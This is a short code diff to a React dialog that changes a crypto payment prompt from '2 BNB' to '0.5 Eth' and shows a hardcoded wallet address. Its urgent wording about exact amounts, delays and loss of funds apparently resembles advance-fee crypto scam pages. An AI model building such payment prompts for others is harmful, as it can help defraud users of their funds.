@@ -220,11 +220,11 @@ Please ensure that all details are accurately implemented to avoid additional ch
         <DialogContent>
           <DialogContentText id="alert-dialog-description">
             <p className='app md:text-sm text-xs'>
-            Send excatly 2 BNB to the wallet address by copying it, to avoid delay or loss of funds.
+            Send excatly 0.5 Eth to the wallet address by copying it, to avoid delay or loss of funds.
            
             </p>
             <p className='text-sm mt-2 text-black font-bold app'>
-              BNB Address:
+              Eth Address:
             </p>
             <p className='app text-black'>
             0x4E8ACC4c74e5FF78d1ff32AC345DfC3dfdE5A887
